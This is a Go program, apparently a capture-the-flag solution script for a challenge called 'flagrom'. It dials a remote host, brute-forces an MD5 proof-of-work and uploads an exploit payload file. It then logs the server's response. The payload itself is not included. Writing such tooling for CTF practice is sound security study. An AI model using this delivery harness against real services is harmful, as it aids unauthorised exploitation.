// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"strings"
)

var (
	remote  = flag.String("remote", "", "the host:port to dial")
	payload = flag.String("payload", "payload.bin", "path to exploit payload")
)

func main() {
	flag.Parse()

	if *remote == "" || *payload == "" {
		log.Fatalf("--remote and --payload are required")
	}

	conn, err := net.Dial("tcp", *remote)
	if err != nil {
		log.Fatalf("Error dialing %q: %v", *remote, err)
	}

	s := bufio.NewScanner(conn)
	challenge := strings.Fields(strings.TrimSuffix(scanUntil(s, "What's a printable"), "?"))
	fmt.Fprintf(conn, "%s\n", solveProofOfWork(challenge[len(challenge)-1]))

	p, err := ioutil.ReadFile(*payload)
	if err != nil {
		log.Fatalf("Error reading %q: %v", *payload, err)
	}
	scanUntil(s, "What's the length")
	fmt.Fprintf(conn, "%d\n", len(p))
	fmt.Fprintf(conn, "%s", p)

	dump(s)
}

func scanUntil(s *bufio.Scanner, prefix string) string {
	for s.Scan() {
		log.Println(s.Text())
		if strings.HasPrefix(s.Text(), prefix) {
			return s.Text()
		}
	}
	log.Fatalf("Error scanning: %v", s.Err())
	return ""
}

func solveProofOfWork(prefix string) string {
	p, err := hex.DecodeString(prefix)
	if err != nil {
		log.Fatalf("Error decoding prefix: %v", err)
	}
	for i := 0; ; i++ {
		s := fmt.Sprintf("flagrom-%d", i)
		sum := md5.Sum([]byte(s))
		if bytes.HasPrefix(sum[:], p) {
			log.Printf("%v", s)
			return string(s)
		}
	}
}

func dump(s *bufio.Scanner) {
	for s.Scan() {
		log.Printf("%v", s.Text())
	}
	log.Fatalf("Error reading: %v", s.Err())
}
